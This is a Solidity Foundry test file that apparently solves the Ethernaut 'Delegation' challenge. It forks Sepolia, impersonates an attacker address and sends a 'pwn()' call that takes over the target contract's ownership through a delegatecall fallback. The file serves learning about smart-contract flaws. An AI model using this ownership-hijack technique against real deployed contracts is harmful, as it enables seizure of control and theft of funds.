// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Test} from "forge-std/Test.sol";

interface IDelegation {
    function owner() external view returns(address);
}

contract TestDelegation is Test{
    address constant public TARGET_ADDRESS = 0x20556d474CCb3d5CA2Ab7BA2170F097718cf5d35;
    IDelegation target;
    address attacker;

    function setUp() public {
        string memory rpcUrl = vm.envString("SEPOLIA_RPC_URL");
        vm.createSelectFork(rpcUrl);

        attacker = makeAddr("attacker");
        target = IDelegation(TARGET_ADDRESS);
    }

    function testDelegation() public {
        vm.startPrank(attacker);
        bytes memory sig = abi.encodeWithSignature("pwn()");
        address(target).call(sig);
        vm.stopPrank();

        assertEq(target.owner() , attacker);
    }
}